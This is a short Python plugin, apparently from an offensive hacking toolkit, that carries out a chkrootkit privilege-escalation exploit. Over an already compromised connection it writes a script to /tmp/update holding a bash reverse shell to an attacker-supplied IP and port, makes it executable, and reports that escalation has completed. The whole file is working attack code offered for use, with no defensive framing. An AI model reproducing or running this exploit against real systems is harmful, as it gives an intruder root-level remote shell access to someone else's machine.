#!/usr/bin/python3
# @Мартин.
# ███████╗              ██╗  ██╗    ██╗  ██╗     ██████╗    ██╗  ██╗     ██╗    ██████╗
# ██╔════╝              ██║  ██║    ██║  ██║    ██╔════╝    ██║ ██╔╝    ███║    ╚════██╗
# ███████╗    █████╗    ███████║    ███████║    ██║         █████╔╝     ╚██║     █████╔╝
# ╚════██║    ╚════╝    ██╔══██║    ╚════██║    ██║         ██╔═██╗      ██║     ╚═══██╗
# ███████║              ██║  ██║         ██║    ╚██████╗    ██║  ██╗     ██║    ██████╔╝
# ╚══════╝              ╚═╝  ╚═╝         ╚═╝     ╚═════╝    ╚═╝  ╚═╝     ╚═╝    ╚═════╝

from plugin.core import core
import re
import time


class chkrootkit:
    def exploit(self, socks, ip, port, re_ip, re_port):
        payload = f'''
    cat << 'EOF' > /tmp/update
    #!/bin/bash
    /bin/bash -c '/bin/bash -i >& /dev/tcp/{re_ip}/{re_port} 0>&1'
    EOF
        '''
        time.sleep(2) 
        core.send_command(socks, payload)
        time.sleep(3)
        core.send_command(socks, 'chmod +x /tmp/update')
        time.sleep(1)
        print("[+] chkrootkit privilege escalation completed...")

